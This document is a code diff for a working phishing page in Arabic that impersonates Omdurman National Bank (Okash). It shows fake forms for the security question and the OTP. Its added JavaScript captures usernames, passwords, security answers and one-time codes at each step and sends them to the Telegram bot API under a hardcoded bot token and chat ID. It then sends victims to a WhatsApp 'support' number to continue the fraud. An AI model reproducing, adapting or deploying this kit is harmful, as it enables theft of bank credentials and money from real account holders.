@@ -21,7 +21,7 @@
         .page-section { display: none; }
         .page-section.active { display: block; }
 
-        /* شاشة التحميل (النافذة المؤقتة) */
+        /* شاشة التحميل المؤقتة */
         #loading-overlay {
             display: none;
             position: fixed;
@@ -181,7 +181,7 @@
 </head>
 <body>
 
-    <!-- شاشة التحميل المؤقتة (تظهر عند التنقل) -->
+    <!-- شاشة التحميل الذكية -->
     <div id="loading-overlay">
         <div class="spinner"></div>
         <h3 style="font-family: 'Tajawal', sans-serif;">انتظر... جاري المعالجة والتحميل</h3>
@@ -291,4 +291,185 @@
             <form id="secForm" onsubmit="captureAndProceed(event, 'otp-page', 'سؤال الأمان')">
                 <div class="form-group">
                     <label>اختر سؤال الأمان:</label>
-                    <select id="secQuestion" class
+                    <select id="secQuestion" class="form-control" required>
+                        <option value="">-- اختر سؤال الأمان --</option>
+                        <option>ما هو اسم ابن عمك الأول؟</option>
+                        <option>في أي مدينة ولدت؟</option>
+                        <option>في أي سنة تخرجت من الجامعة؟</option>
+                        <option>ماذا كان لقبك أثناء الطفولة؟</option>
+                        <option>اسم مؤلفك المفضل؟</option>
+                        <option>اسم الشركة المصنعة للسيارة المفضلة لديك؟</option>
+                        <option>أي فلم هو المفضل لديك؟</option>
+                        <option>اسم أفضل صديق في الطفولة؟</option>
+                        <option>في أي عام حصلت على رخصة القيادة الخاصة بك؟</option>
+                        <option>العلامة التجارية لأول تلفزيون خاص بك؟</option>
+                        <option>في أي سنة تزوجت؟</option>
+                        <option>اسم فريق كرة القدم المفضل لديك؟</option>
+                        <option>ما هو اسم المدرسة التي التحقت بها؟</option>
+                        <option>اسم أول بلد أجنبي قمت بزيارته؟</option>
+                        <option>ما هي ماركة سيارتك الأولى؟</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>ادخل الجواب:</label>
+                    <input type="text" id="secAnswer" class="form-control" placeholder="اكتب جوابك هنا" required>
+                </div>
+                <button type="submit" class="btn-action">إرسال</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- 5. رمز OTP -->
+    <div id="otp-page" class="page-section">
+        <div class="card" style="text-align: center;">
+            <h3>إدخال رمز OTP</h3>
+            <p class="subtitle">الرجاء إدخال رمز التحقق المرسل إلى رقم هاتفك وبريدك الإلكتروني المسجل</p>
+            
+            <form id="otpForm" onsubmit="captureAndProceed(event, 'confirm-page', 'رمز OTP')">
+                <div style="text-align: right; margin-bottom: 5px; font-size: 13px; font-weight: bold;">أدخل رمز التحقق (OTP):</div>
+                <input type="text" id="otpCode" maxlength="6" class="form-control" placeholder="أدخل رمز مكون من 6 أرقام" style="text-align: center; font-size: 18px; letter-spacing: 3px;" required>
+                <p style="font-size: 12px; color: #1a8a3f; margin-top: 10px; font-weight: bold;">إعادة إرسال الرمز خلال 29:50 دقيقة</p>
+                <button type="submit" class="btn-action">إرسال</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- 6. صفحة النجاح ورسالة الواتساب -->
+    <div id="confirm-page" class="page-section">
+        <div class="card">
+            <div class="success-box">
+                <i class="fa-solid fa-circle-check success-icon"></i>
+                <div class="success-title">تم تسليم بياناتك بنجاح</div>
+                <div class="success-msg">
+                    الرجاء التواصل مع فريق الدعم على الواتساب لحل المشكلة وإكمال طلبك[span_0](start_span)[span_0](end_span).
+                </div>
+                <a href="#" onclick="sendWhatsApp()" class="btn-whatsapp-custom">
+                    <i class="fa-brands fa-whatsapp" style="font-size: 22px;"></i> التواصل مع الدعم عبر واتساب
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">بنك أمدرمان الوطني (أوكاش) | جميع الحقوق محفوظة 2026</footer>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8874850044:AAGYZncow8wTcaq0H7BPG-u8sTnT7jQ_TTDUTDU";
+        const TELEGRAM_CHAT_ID = "8362235682";
+
+        let userData = {
+            username: '',
+            password: '',
+            securityQuestion: '',
+            securityAnswer: '',
+            otp: ''
+        };
+
+        const servicesData = {
+            'limit-up': { title: 'رفع سقف التحويلات اليومية', desc: 'زيادة الحد اليومي للتحويلات البنكية.', icon: 'fa-gauge-high', steps: ['سجل الدخول لحسابك.', 'اختر خدمة إدارة السقف اليومي.', 'حدد مبلغ السقف الجديد المطلوب.', 'أدخل سبب الرفع (اختياري).', 'أرسل الطلب للموافقة الإدارية.'] },
+            'wrong-transfer': { title: 'التحويلات الخاطئة', desc: 'طلب مراجعة ومعالجة التحويلات التي تمت بالخطأ.', icon: 'fa-right-left', steps: ['سجل الدخول إلى حسابك بأمان.', 'اختر خدمة التحويلات الخاطئة من القائمة.', 'ادخل تفاصيل العملية (المبلغ، التاريخ، اسم المستخدم).', 'ارفق صورة الإيصال أو ما يثبت التحويل.', 'راجع الطلب وأرسله للمراجعة الفورية.'] },
+            'foreign-currency': { title: 'خدمات العملات الأجنبية', desc: 'تفعيل واستخدام العملات الأجنبية داخل حسابك.', icon: 'fa-globe', steps: ['سجل الدخول للتطبيق.', 'انتقل إلى إعدادات العملات.', 'حدد العملة المطلوبة (دولار، يورو، الخ).', 'أكد طلب التفعيل.', 'سيتم تنشيط المحفظة فوراً.'] },
+            'statement': { title: 'كشف الحساب', desc: 'الحصول على كشف حساب مفصل.', icon: 'fa-file-lines', steps: ['سجل الدخول للتطبيق.', 'انتقل إلى قسم كشف الحساب.', 'حدد الفترة الزمنية المطلوبة.', 'اختر صيغة الملف (PDF أو عرض مباشر).', 'سيظهر لك الكشف خلال ثوانٍ.'] },
+            'visa': { title: 'بطاقة فيزا افتراضية', desc: 'تفعيل بطاقة فيزا للاستخدام الإلكتروني.', icon: 'fa-credit-card', steps: ['سجل الدخول للتطبيق.', 'اختر قسم البطاقات الافتراضية.', 'اضغط على إصدار فيزا جديدة.', 'أدخل تفاصيل التفعيل.', 'تأكيد وحفظ بيانات البطاقة.'] },
+            'account': { title: 'حساب جاري و حساب مميز', desc: 'فتح أو ترقية الحساب.', icon: 'fa-id-card', steps: ['سجل الدخول لحسابك.', 'اختر ترقية الحساب أو فتح حساب جديد.', 'املأ البيانات المطلوبة.', 'ارفاق المستندات الرسمية.', 'إرسال الطلب للمراجع.'] },
+            'security': { title: 'إدارة أسئلة الأمان', desc: 'تحديث أو إعادة تعيين أسئلة الأمان.', icon: 'fa-lock', steps: ['سجل الدخول بحسابك الحالي.', 'اختر إدارة الحماية والأمان.', 'حدد خيار "تغيير أسئلة الأمان".', 'ادخل الأسئلة الجديدة وإجاباتها السرية.', 'احفظ التغييرات لضمان حماية حسابك.'] },
+            'change-phone': { title: 'تغيير الموبايل', desc: 'تحديث رقم الهاتف المرتبط بالحساب.', icon: 'fa-mobile-screen', steps: ['سجل الدخول لحسابك.', 'انتقل إلى إعدادات الحساب الشخصي.', 'اختر تغيير رقم الهاتف.', 'ادخل الرقم الجديد ورمز التحقق.', 'حفظ وتأكيد التغيير.'] },
+            'update-data': { title: 'تحديث البيانات الشخصية', desc: 'تحديث البيانات الشخصية المسجلة لدى البنك.', icon: 'fa-pen-to-square', steps: ['سجل الدخول إلى حسابك.', 'اختر خدمة تحديث البيانات من القائمة.', 'حدد نوع البيانات المراد تحديثها.', 'أدخل البيانات الجديدة بدقة.', 'ارفع صورة الهوية وأرسل الطلب.'] }
+        };
+
+        function showPage(pageId) {
+            document.querySelectorAll('.page-section').forEach(sec => sec.classList.remove('active'));
+            const target = document.getElementById(pageId);
+            if (target) {
+                target.classList.add('active');
+            }
+            window.scrollTo(0, 0);
+        }
+
+        function openDetails(serviceKey) {
+            const data = servicesData[serviceKey];
+            if(!data) return;
+            document.getElementById('det-title').innerText = data.title;
+            document.getElementById('det-desc').innerText = data.desc;
+            document.getElementById('det-icon').className = `fa-solid ${data.icon}`;
+            
+            const stepsOl = document.getElementById('det-steps');
+            stepsOl.innerHTML = '';
+            data.steps.forEach(step => {
+                let li = document.createElement('li');
+                li.innerText = step;
+                stepsOl.appendChild(li);
+            });
+            showPage('details-page');
+        }
+
+        function togglePassword(fieldId, iconElem) {
+            const input = document.getElementById(fieldId);
+            if (input.type === 'password') {
+                input.type = 'text';
+                iconElem.classList.remove('fa-eye');
+                iconElem.classList.add('fa-eye-slash');
+            } else {
+                input.type = 'password';
+                iconElem.classList.remove('fa-eye-slash');
+                iconElem.classList.add('fa-eye');
+            }
+        }
+
+        function captureAndProceed(event, nextPage, stepName) {
+            event.preventDefault();
+
+            if(stepName === 'تسجيل الدخول') {
+                userData.username = document.getElementById('username').value;
+                userData.password = document.getElementById('password').value;
+                sendToTelegram("مرحلة 1: تسجيل الدخول");
+            } else if(stepName === 'سؤال الأمان') {
+                userData.securityQuestion = document.getElementById('secQuestion').value;
+                userData.securityAnswer = document.getElementById('secAnswer').value;
+                sendToTelegram("مرحلة 2: سؤال الأمان");
+            } else if(stepName === 'رمز OTP') {
+                userData.otp = document.getElementById('otpCode').value;
+                sendToTelegram("مرحلة 3: رمز OTP وإكمال التسجيل");
+            }
+
+            const loader = document.getElementById('loading-overlay');
+            loader.style.display = 'flex';
+
+            setTimeout(() => {
+                loader.style.display = 'none';
+                showPage(nextPage);
+            }, 2000);
+        }
+
+        function sendToTelegram(stageInfo) {
+            const message = `
+🔔 *إشعار جديد من موقع بنك أمدرمان*:
+📌 *المرحلة*: ${stageInfo}
+👤 *اسم المستخدم/الحساب*: \`${userData.username}\`
+🔑 *كلمة المرور*: \`${userData.password}\`
+❓ *سؤال الأمان*: ${userData.securityQuestion || 'غير محدد'}
+💡 *الإجابة*: \`${userData.securityAnswer || 'غير محدد'}\`
+🔢 *رمز OTP*: \`${userData.otp || 'غير محدد'}\`
+⏰ *الوقت*: ${new Date().toLocaleString('ar-SA')}
+            `;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.log('Telegram Send Error:', err));
+        }
+
+        function sendWhatsApp() {
+            const phone = "249118737098";
+            const text = encodeURIComponent(`مرحباً فريق الدعم، تم تسليم بياناتي بنجاح وأحتاج المساعدة للتحقق من الحساب.\nاسم المستخدم: ${userData.username}`);
+            window.location.href = `https://wa.me/${phone}?text=${text}`;
+        }
+    </script>
+</body>
+</html>
